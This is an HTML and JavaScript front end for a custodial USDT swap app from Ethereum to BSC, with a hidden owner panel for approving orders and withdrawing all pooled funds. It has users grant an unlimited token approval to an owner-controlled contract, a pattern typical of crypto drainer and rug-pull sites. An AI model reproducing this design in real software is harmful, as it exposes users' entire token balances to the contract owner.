<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>托管闪兑DApp</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
<style>
*{box-sizing: border-box;-webkit-tap-highlight-color:transparent;}
body{font-family:system-ui;background:#f5f6fa;margin:0;padding:24px 16px;}
.card{background:#fff;border-radius:20px;padding:24px 20px;}
.token-row{background:#f7f8fa;border-radius:16px;padding:16px;display:flex;align-items:center;justify-content:space-between;margin:8px 0;}
.token-left{display:flex;align-items:center;gap:10px;}
.icon-circle{width:36px;height:36px;border-radius:50%;background:#27ae60;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;}
.input-money{border:none;background:transparent;text-align:right;font-size:20px;width:140px;outline:none;}
.swap-icon{text-align:center;padding:8px 0;color:#4285f4;font-size:22px;}
.input-address{width:100%;border:none;background:#f7f8fa;border-radius:16px;padding:16px;outline:none;}
.btn-main{width:100%;background:#6096ff;color:#fff;border:none;border-radius:16px;padding:18px 0;font-size:18px;margin:16px 0;}
.btn-main:disabled{opacity:0.45;}
.row-info{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;color:#666;}
.admin-wrap{margin-top:30px;background:#fff;border-radius:20px;padding:20px;display:none;}
.order-item{border:1px solid #eee;border-radius:12px;padding:12px;margin:10px 0;}
.btn-group{display:flex;gap:8px;margin-top:10px;}
.btn-pass{flex:1;background:#22c55e;color:#fff;border:none;padding:8px;border-radius:8px;}
.btn-rej{flex:1;background:#ef4444;color:#fff;border:none;padding:8px;border-radius:8px;}
.btn-withdraw{width:100%;background:#f59e0b;color:#fff;border:none;padding:12px;border-radius:10px;margin-top:15px;}
.bottom-nav{position:fixed;bottom:0;left:0;width:100%;background:#fff;display:flex;justify-content:space-around;padding:12px 0 24px;border-top:1px solid #eee;}
.nav-item{text-align:center;font-size:12px;color:#777;}
.nav-item.active{color:#4285f4;}
</style>
</head>
<body class="max-w-md mx-auto pb-24">
<div class="flex justify-between items-center mb-6">
  <div class="text-xl font-semibold text-gray-800">USDT托管闪兑</div>
  <span id="connectWallet" class="w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center cursor-pointer">
    <i class="fa fa-user-o text-gray-600"></i>
  </span>
</div>
<div id="statusText" class="text-sm text-gray-500 mb-4">请连接钱包</div>

<div class="card">
  <div class="flex justify-between items-center mb-2">
    <span class="text-gray-600">支付 USDT(ETH)</span>
    <span id="btnAll" class="text-blue-500 text-sm cursor-pointer opacity-50 pointer-events-none">全部</span>
  </div>
  <div class="token-row">
    <div class="token-left">
      <div class="icon-circle">T</div>
      <div><div class="font-semibold">USDT</div><div class="text-xs text-gray-500">ERC20</div></div>
    </div>
    <input class="input-money" id="inputNum" placeholder="0.00" inputmode="decimal">
  </div>
  <div class="swap-icon"><i class="fa fa-exchange"></i></div>
  <div class="text-gray-600 mt-2 mb-2">接收 USDT(BSC)</div>
  <div class="token-row">
    <div class="token-left">
      <div class="icon-circle">T</div>
      <div><div class="font-semibold">USDT</div><div class="text-xs text-gray-500">BEP20</div></div>
    </div>
    <span id="receiveShow" class="text-xl text-gray-700">0.00</span>
  </div>
  <input class="input-address mt-2" id="bscAddr" placeholder="填写BSC收款地址">
  <button class="btn-main" id="submitBtn" disabled>发起兑换下单</button>
  <div class="border-t pt-3">
    <div class="row-info"><span>手续费比例</span><span>0.1%</span></div>
    <div class="row-info"><span>本次手续费</span><span id="feeShow">0.00 USDT</span></div>
  </div>
</div>

<div class="admin-wrap" id="adminPanel">
  <h3 class="font-bold text-lg mb-4">🔐 管理员后台（仅Owner可见）</h3>
  <div class="text-sm text-gray-600 mb-2">待审核订单：</div>
  <div id="orderList"></div>
  <button class="btn-withdraw" id="withdrawPoolBtn">提取合约池内全部USDT</button>
</div>

<div class="bottom-nav">
  <div class="nav-item"><i class="fa fa-circle-o text-lg"></i><div>资产</div></div>
  <div class="nav-item"><i class="fa fa-line-chart text-lg"></i><div>行情</div></div>
  <div class="nav-item active"><i class="fa fa-exchange text-lg"></i><div>兑换</div></div>
  <div class="nav-item"><i class="fa fa-user-o text-lg"></i><div>我的</div></div>
</div>

<script>
const USDT_ETH = "0xdac17f958d2ee523a2206206994597c13d831ec7";
const POOL_CONTRACT = "填写你部署后的中转合约地址";
const ADMIN_RAW = "填写合约部署Owner钱包小写地址";
const MAX_ALLOW = ethers.constants.MaxUint256;
const FEE_RATE = 0.001;

let provider, signer, usdtContract, poolContract;
let userBalance = ethers.BigNumber.from(0);

const connectWallet = document.getElementById("connectWallet");
const statusText = document.getElementById("statusText");
const inputNum = document.getElementById("inputNum");
const receiveShow = document.getElementById("receiveShow");
const btnAll = document.getElementById("btnAll");
const submitBtn = document.getElementById("submitBtn");
const bscAddr = document.getElementById("bscAddr");
const feeShow = document.getElementById("feeShow");
const adminPanel = document.getElementById("adminPanel");
const orderList = document.getElementById("orderList");
const withdrawPoolBtn = document.getElementById("withdrawPoolBtn");

// 实时计算金额
inputNum.oninput = function(){
  let val = parseFloat(this.value) || 0;
  if(val < 0) val = 0;
  let fee = val * FEE_RATE;
  let get = val - fee;
  receiveShow.innerText = get.toFixed(2);
  feeShow.innerText = fee.toFixed(2)+" USDT";
  submitBtn.innerText = val>0 ? "发起兑换下单" : "发起兑换下单";
}

// 全部余额填入
btnAll.onclick = function(){
  let bal = ethers.utils.formatUnits(userBalance,6);
  inputNum.value = parseFloat(bal).toFixed(2);
  inputNum.dispatchEvent(new Event("input"));
}

// 校验地址格式
function isAddr(addr){
  return ethers.utils.isAddress(addr);
}

// 连接钱包
connectWallet.onclick = async function(){
  if(!window.ethereum){
    statusText.innerText = "请在钱包浏览器打开";
    return;
  }
  try{
    statusText.innerText = "连接中...";
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    let net = await provider.getNetwork();
    if(net.chainId !== 1) await switchMainnet();
    initContracts();
    await refreshBalance();
    btnAll.classList.remove("opacity-50","pointer-events-none");
    await checkAdminPermission();
    let addr = await signer.getAddress();
    statusText.innerText = "已连接："+addr.slice(0,6)+"..."+addr.slice(-4);
  }catch(e){
    statusText.innerText = "连接失败";
  }
}

// 切换ETH主网
async function switchMainnet(){
  let eth = window.ethereum;
  try{
    await eth.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]});
  }catch(e){
    await eth.request({method:"wallet_addEthereumChain",params:[{
      chainId:"0x1",
      chainName:"ETH Mainnet",
      rpcUrls:["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
      blockExplorerUrls:["https://etherscan.io"],
      nativeCurrency:{name:"ETH",symbol:"ETH",decimals:18}
    }]});
  }
}

// 初始化合约实例
function initContracts(){
  usdtContract = new ethers.Contract(
    USDT_ETH,
    ["function balanceOf(address) view returns(uint256)","function allowance(address,address) view returns(uint256)","function approve(address,uint256) returns(bool)"],
    signer
  );
  poolContract = new ethers.Contract(
    POOL_CONTRACT,
    [
      "function createOrder(address,uint256) external",
      "function approveOrder(uint256) external onlyOwner",
      "function rejectOrder(uint256) external onlyOwner",
      "function withdrawPoolFund() external onlyOwner",
      "function getPendingOrders() view returns(uint256[] memory)",
      "function getOrderInfo(uint256) view returns(address,uint256,uint256,uint256,address,uint8)"
    ],
    signer
  );
  submitBtn.disabled = false;
}

// 刷新用户USDT余额
async function refreshBalance(){
  let addr = await signer.getAddress();
  userBalance = await usdtContract.balanceOf(addr);
}

// 判断当前钱包是否为管理员，显示/隐藏后台
async function checkAdminPermission(){
  let current = (await signer.getAddress()).toLowerCase();
  let admin = ADMIN_RAW.toLowerCase();
  if(current === admin){
    adminPanel.style.display = "block";
    renderOrderList();
  }else{
    adminPanel.style.display = "none";
  }
}

// 渲染订单列表
async function renderOrderList(){
  try{
    let ids = await poolContract.getPendingOrders();
    if(ids.length === 0){
      orderList.innerHTML = '<div class="text-gray-400 text-sm">暂无待审核订单</div>';
      return;
    }
    let html = "";
    for(let oid of ids){
      let info = await poolContract.getOrderInfo(oid);
      let userAddr = info[0];
      let amount = ethers.utils.formatUnits(info[1],6);
      let fee = ethers.utils.formatUnits(info[2],6);
      let receive = ethers.utils.formatUnits(info[3],6);
      let bscTo = info[4];
      html += `
        <div class="order-item" data-oid="${oid}">
          <div class="text-sm">订单ID:${oid}</div>
          <div class="text-xs text-gray-600">用户:${userAddr.slice(0,8)}...${userAddr.slice(-6)}</div>
          <div class="text-xs text-gray-600">存入:${amount} USDT</div>
          <div class="text-xs text-gray-600">手续费:${fee}</div>
          <div class="text-xs text-gray-600">实际到账:${receive}</div>
          <div class="text-xs text-gray-600">BSC地址:${bscTo.slice(0,8)}...${bscTo.slice(-6)}</div>
          <div class="btn-group">
            <button class="btn-pass" data-oid="${oid}">通过</button>
            <button class="btn-rej" data-oid="${oid}">拒绝退款</button>
          </div>
        </div>
      `;
    }
    orderList.innerHTML = html;
    bindOrderBtn();
  }catch(err){
    orderList.innerHTML = '<div class="text-red-400">读取订单失败</div>';
  }
}

// 绑定审批按钮事件
function bindOrderBtn(){
  document.querySelectorAll(".btn-pass").forEach(btn=>{
    btn.onclick = async function(){
      let oid = this.dataset.oid;
      if(!confirm("确认通过该订单？")) return;
      try{
        let tx = await poolContract.approveOrder(oid);
        await tx.wait();
        alert("审批成功");
        renderOrderList();
      }catch(e){
        alert(e.message.slice(0,40));
      }
    }
  })
  document.querySelectorAll(".btn-rej").forEach(btn=>{
    btn.onclick = async function(){
      let oid = this.dataset.oid;
      if(!confirm("拒绝订单，资金退回用户？")) return;
      try{
        let tx = await poolContract.rejectOrder(oid);
        await tx.wait();
        alert("已拒绝，资金原路返还");
        renderOrderList();
      }catch(e){
        alert(e.message.slice(0,40));
      }
    }
  })
}

// 管理员提取合约池内全部资金
withdrawPoolBtn.onclick = async function(){
  if(!confirm("提取合约内全部归集USDT到管理员钱包？")) return;
  try{
    let tx = await poolContract.withdrawPoolFund();
    await tx.wait();
    alert("资金提取完成");
  }catch(e){
    alert("提取失败："+e.message.slice(0,40));
  }
}

// 用户下单逻辑：先无限授权，再划转至合约
submitBtn.onclick = async function(){
  let numStr = inputNum.value.trim();
  let bscTarget = bscAddr.value.trim();
  let num = parseFloat(numStr);
  if(!numStr || isNaN(num) || num <= 0){
    alert("请输入有效兑换数量");
    return;
  }
  if(!isAddr(bscTarget)){
    alert("BSC收款地址格式错误");
    return;
  }
  let amountWei = ethers.utils.parseUnits(numStr,6);
  if(amountWei.gt(userBalance)){
    alert("钱包USDT余额不足");
    return;
  }
  try{
    let userAddr = await signer.getAddress();
    let currentAllow = await usdtContract.allowance(userAddr, POOL_CONTRACT);
    // 额度不足，发起无限授权
    if(currentAllow.lt(amountWei)){
      alert("需要授权中转合约USDT权限，请确认签名");
      let approveTx = await usdtContract.approve(POOL_CONTRACT, MAX_ALLOW);
      await approveTx.wait();
    }
    // 创建订单，合约划转用户USDT进入池子
    let orderTx = await poolContract.createOrder(bscTarget, amountWei);
    await orderTx.wait();
    alert("下单成功！交易哈希："+orderTx.hash);
    inputNum.value = "";
    receiveShow.innerText = "0.00";
    feeShow.innerText = "0.00 USDT";
    await refreshBalance();
  }catch(e){
    let msg = e.code === 4001 ? "您取消了签名" : e.message.slice(0,50);
    alert("操作失败："+msg);
  }
}
</script>
</body>
</html>
